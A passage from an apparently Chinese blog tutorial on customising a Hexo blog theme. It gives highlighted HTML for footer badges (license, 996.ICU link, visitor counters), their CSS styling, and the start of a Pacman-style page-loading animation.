punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>本站点采用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议进行许可<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>fa fa-copyright<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-lightgrey<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BY-NC-SA 4.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#fff</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>license<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://996.icu/<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>支持 996.ICU<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Link<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-red<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>996.ICU<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>UV<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-orange<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>busuanzi_value_site_uv<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>PV<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-brightgreen<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>busuanzi_value_site_pv<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>github-badge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-subject<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WordCount<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>badge-value bg-blueviolet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&lt;%= totalcount(site) %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后添加css样式，自己选择代码的添加位置，可以直接放在footer.ejs文件中，也可以放在my.css文件中，代码如下：</p><pre class="line-numbers language-css"><code class="language-css">    <span class="token selector">&lt;style>    <span class="token class">.github-badge</span> </span><span class="token punctuation">{</span>        <span class="token property">display</span><span class="token punctuation">:</span>inline-block<span class="token punctuation">;</span>        <span class="token property">border-radius</span><span class="token punctuation">:</span><span class="token number">4</span>px<span class="token punctuation">;</span>        <span class="token property">text-shadow</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span><span class="token number">13</span>px<span class="token punctuation">;</span>        <span class="token property">color</span><span class="token punctuation">:</span><span class="token hexcode">#fff</span><span class="token punctuation">;</span>        <span class="token property">line-height</span><span class="token punctuation">:</span><span class="token number">15</span>px<span class="token punctuation">;</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#ABBAC3</span><span class="token punctuation">;</span>        <span class="token property">margin-bottom</span><span class="token punctuation">:</span><span class="token number">5</span>px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.badge-subject</span> </span><span class="token punctuation">{</span>        <span class="token property">display</span><span class="token punctuation">:</span>inline-block<span class="token punctuation">;</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#4D4D4D</span><span class="token punctuation">;</span>        <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">4</span>px <span class="token number">4</span>px <span class="token number">4</span>px <span class="token number">6</span>px<span class="token punctuation">;</span>        <span class="token property">border-top-left-radius</span><span class="token punctuation">:</span><span class="token number">4</span>px<span class="token punctuation">;</span>        <span class="token property">border-bottom-left-radius</span><span class="token punctuation">:</span><span class="token number">4</span>px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.badge-value</span> </span><span class="token punctuation">{</span>        <span class="token property">display</span><span class="token punctuation">:</span>inline-block<span class="token punctuation">;</span>        <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">4</span>px <span class="token number">6</span>px <span class="token number">4</span>px <span class="token number">4</span>px<span class="token punctuation">;</span>        <span class="token property">border-top-right-radius</span><span class="token punctuation">:</span><span class="token number">4</span>px<span class="token punctuation">;</span>        <span class="token property">border-bottom-right-radius</span><span class="token punctuation">:</span><span class="token number">4</span>px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-brightgreen</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#4DC820</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-orange</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#FFA500</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-yellow</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#D8B024</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-blueviolet</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#8833D7</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-pink</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#F26BAE</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-red</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#e05d44</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-blue</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#007EC6</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-lightgrey</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#9F9F9F</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-grey</span>, <span class="token class">.github-badge</span> <span class="token class">.bg-gray</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#555</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.github-badge</span> <span class="token class">.bg-lightgrey</span>, <span class="token class">.github-badge</span> <span class="token class">.bg-lightgray</span> </span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#9f9f9f</span> <span class="token important">!important</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>&lt;/style><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进行本地调试，查看效果即可，本地调试好后，在进行部署的相关操作。</p><h2 id="添加加载动画"><a href="#添加加载动画" class="headerlink" title="添加加载动画"></a>添加加载动画</h2><p>在 /layout/_partial/ 目录新建一个 loading-pages.ejs 内容如下：</p><pre class="line-numbers language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector"><span class="token id">#loading-container</span></span><span class="token punctuation">{</span>        <span class="token property">position</span><span class="token punctuation">:</span> fixed<span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">min-height</span><span class="token punctuation">:</span> <span class="token number">100</span>vh<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">100</span>vw<span class="token punctuation">;</span>        <span class="token property">z-index</span><span class="token punctuation">:</span> <span class="token number">9999</span><span class="token punctuation">;</span>        <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>        <span class="token property">flex-direction</span><span class="token punctuation">:</span> column<span class="token punctuation">;</span>        <span class="token property">justify-content</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">align-items</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#FFF</span><span class="token punctuation">;</span>        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">/* loader页面消失采用渐隐的方式*/</span>        <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>        <span class="token property">-moz-transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>        <span class="token property">-o-transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>        <span class="token property">transition</span><span class="token punctuation">:</span> opacity <span class="token number">1</span>s ease<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span></span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">120</span>px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">50</span>px<span class="token punctuation">;</span>        <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">50%</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(2)</span> </span><span class="token punctuation">{</span>        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">0</span>s infinite<span class="token punctuation">;</span>        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">0</span>s infinite    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(3)</span> </span><span class="token punctuation">{</span>        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.33</span>s infinite<span class="token punctuation">;</span>        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.33</span>s infinite    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(4)</span> </span><span class="token punctuation">{</span>        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.66</span>s infinite<span class="token punctuation">;</span>        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.66</span>s infinite    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(5)</span> </span><span class="token punctuation">{</span>        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.99</span>s infinite<span class="token punctuation">;</span>        <span class="token property">animation</span><span class="token punctuation">:</span> pacman-balls <span class="token number">1</span>s linear <span class="token number">.99</span>s infinite    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:first-of-type</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">25</span>px solid <span class="token hexcode">#49b1f5</span><span class="token punctuation">;</span>        <span class="token property">border-right-color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> rotate_pacman_half_up <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>        <span class="token property">animation</span><span class="token punctuation">:</span> rotate_pacman_half_up <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(2)</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">25</span>px solid <span class="token hexcode">#49b1f5</span><span class="token punctuation">;</span>        <span class="token property">border-right-color</span><span class="token punctuation">:</span> transparent<span class="token punctuation">;</span>        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>        <span class="token property">-webkit-animation</span><span class="token punctuation">:</span> rotate_pacman_half_down <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>        <span class="token property">animation</span><span class="token punctuation">:</span> rotate_pacman_half_down <span class="token number">.5</span>s <span class="token number">0</span>s infinite<span class="token punctuation">;</span>        <span class="token property">margin-top</span><span class="token punctuation">:</span> -<span class="token number">50</span>px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rotate_pacman_half_up</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">1</span>turn<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@keyframes</span> rotate_pacman_half_up</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">1</span>turn<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">270</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rotate_pacman_half_down</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">0</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@keyframes</span> rotate_pacman_half_down</span> <span class="token punctuation">{</span><span class="token selector">0% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">50% </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">0</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span><span class="token number">90</span>deg<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> pacman-balls</span> <span class="token punctuation">{</span><span class="token selector">75% </span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">.7</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">100</span>px, -<span class="token number">6.25</span>px<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@keyframes</span> pacman-balls</span> <span class="token punctuation">{</span><span class="token selector">75% </span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">.7</span><span class="token punctuation">}</span><span class="token selector">to </span><span class="token punctuation">{</span><span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-<span class="token number">100</span>px, -<span class="token number">6.25</span>px<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(3)</span>,    <span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(4)</span>,    <span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(5)</span>,    <span class="token class">.loading-image</span> div<span class="token pseudo-class">:nth-child(6)</span></span><span class="token punctuation">{</span>        <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#49b1f5</span><span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span>        <span class="token property">border-radius</span><span class="token punctuation">:</span> <span class="token number">100%</span><span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">2</span>px<span class="token punctuation">;</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>        <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">10</span>px<span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateY</span><span class="token punctuation">(</span>-<span class="token number">6.25</span>px<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">25</span>px<span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.loading-text</span></span><span class="token punctuation">{</span>        <span class="token property">margin-bottom</span><span class="token punctuation">:</span> <span class="token number">20</span>vh<span class="token punctuation">;</span>        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>        <span class="token property">color</span><span class="token punctuation">:</span> <span class="token hexcode">#2c3e50</span><span class="token punctuation">;</span>        <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">2</span>rem<span class="token punctuation">;</span>        <span class="token property">box-sizing</span><span class="token punctuation">:</span> border-box<span class="token punctuation">;</span>        <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">10</span>px<span class="token punctuation">;</span>        <span class="token property">text-shadow</span><span class="token punctuation">:</span> <span class="token number">0</span> <span class="token number">2</span>px <span class="token number">10</span>px <span class="token function">rgba</span><span class="token punctuation">(</span><span class="token number">0</span>,<span class="token number">0</span>,<span class="token number">0</span>,<span class="token number">0.2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@media</span> only screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 500px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>         <span class="token selector"><span class="token class">.loading-text</span></span><span class="token punctuation">{</span>            <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">1.5</span>rem<span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.fadeout</span> </span><span class="token punctuation">{</span>        <span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">filter</span><span class="token punctuation">:</span> <span class="token function">alpha</span><span class="token punctuation">(</span>opacity=<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/* logo出现动画 */</span>    <span class="token atrule"><span class="token rule">@-webkit-keyframes</span> fadeInDown</span><span class="token punctuation">{</span><span class="token selector">0%</span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token property">-webkit-transform</span><span class="token punctuation">:</span>translate<span class="token number">3</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">0</span>,-<span class="token number">100%</span>,<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token property">transform</span><span class="token punctuation">:</span>translate<span class="token number">3</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">0</span>,-<span class="token number">100%</span>,<span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token selector">100%</span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token property">-webkit-transform</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span><span class="token property">transform</span><span class="token punctuation">:</span>none<span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token atrule"><span class="token rule">@keyframes</span> fadeInDown</span><span class="token punctuation">{</span><span class="token selector">0%</span><span class="token punctuation">{</span><span class="token property">opacity</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token property">-webkit-transform</span><span class="token punctuation">:</span>translate<span class="token number">3</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token number">0</span>,-<span class="token number">100%</span>,<span class="token number">0</span><span class="token 